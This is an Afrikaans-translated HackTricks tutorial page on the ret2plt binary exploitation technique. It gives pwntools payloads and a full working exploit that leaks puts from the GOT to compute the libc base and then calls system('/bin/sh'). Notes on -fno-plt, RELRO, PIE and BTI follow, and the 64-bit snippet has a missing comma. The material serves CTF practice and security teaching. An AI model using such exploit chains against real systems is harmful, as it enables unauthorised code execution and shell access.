# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Basiese Inligting

Die doel van hierdie tegniek is om **'n adres van 'n funksie in die PLT te leak** om ASLR te kan omseil. Dit is omdat, byvoorbeeld, as jy die adres van die funksie `puts` uit die libc leak, kan jy dan **bereken waar die basis van `libc` is** en offsets bereken om toegang tot ander funksies soos **`system`** te kry.

Dit kan gedoen word met 'n `pwntools` payload soos ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Let op hoe **`puts`** (wat die adres uit die PLT gebruik) aangeroep word met die adres van `puts` wat in die GOT (Global Offset Table) geleë is. Dit is omdat teen die tyd dat `puts` die GOT-invoer van puts druk, hierdie **invoer die presiese adres van `puts` in geheue sal bevat**.

Let ook op hoe die adres van `main` in die exploit gebruik word sodat wanneer `puts` sy uitvoering beëindig, die **binary calls `main` again instead of exiting** (sodat die leaked adres geldig bly).

> [!CAUTION]
> Let op dat om dit te laat werk die **binary cannot be compiled with PIE** of jy moet **found a leak to bypass PIE** hê om die adres van die PLT, GOT en main te ken. Andersins moet jy eers PIE omseil.

Jy kan 'n [**volledige voorbeeld van hierdie omseiling hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass) vind. Dit was die finale exploit van daardie **voorbeeld**:

<details>
<summary>Full exploit example (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Moderne oorwegings

- **`-fno-plt` builds** (algemeen in moderne distros) vervang `call foo@plt` met `call [foo@got]`. As die binary geen `foo@plt` stub het nie, kan jy steeds die opgeloste adres leak met `puts(elf.got['foo'])` en dan **direk na die GOT‑inskrywing return** (`flat(padding, elf.got['foo'])`) om in libc te spring sodra lazy binding klaar is.
- **Full RELRO / `-Wl,-z,now`**: GOT is lees‑net, maar ret2plt werk steeds vir leaks omdat jy slegs die GOT‑slot lees. As die simbol nooit aangeroep is nie, sal jou eerste ret2plt ook lazy binding uitvoer en dan die opgeloste slot druk.
- **ASLR + PIE**: as PIE geaktiveer is, leAk eers 'n kode‑pointer (bv. saved return address, function pointer, of `.plt` entry via 'n ander format‑string/infoleak) om die PIE‑basis te bereken, en bou dan die ret2plt‑ketting met die herbevestigde PLT/GOT‑adresse.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT‑inskrywings is geldige BTI landing pads (`bti c`), dus wanneer jy op BTI‑geaktiveerde binaries exploit verkies om in die PLT‑stub te spring (of 'n ander BTI‑geannoteerde gadget) in plaas van direk in 'n libc gadget sonder BTI, anders sal die CPU `BRK`/`PAC` foutteiken.
- **Quick resolution helper**: as die teikenfunksie nog nie opgelos is nie en jy 'n leak in een skoot nodig het, ketting die PLT‑aanroep twee keer: eers `elf.plt['foo']` (om te resolve) en dan weer `elf.plt['foo']` met die GOT‑adres as argument om die nou‑gevulde slot te print.

## Ander voorbeelde & Verwysings

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR geaktiveer maar geen PIE; die eerste stap is om 'n overflow te vul tot by die 0x00‑byte van die canary en dan puts aan te roep om dit te leak. Met die canary word 'n ROP gadget geskep om puts aan te roep om die adres van puts uit die GOT te leak en dan 'n ROP gadget om `system('/bin/sh')` aan te roep.
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR geaktiveer, geen canary, stack overflow in main vanaf 'n child‑funksie. ROP gadget om puts aan te roep om die adres van puts uit die GOT te leak en dan 'n one gadget aan te roep.

## Verwysings

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
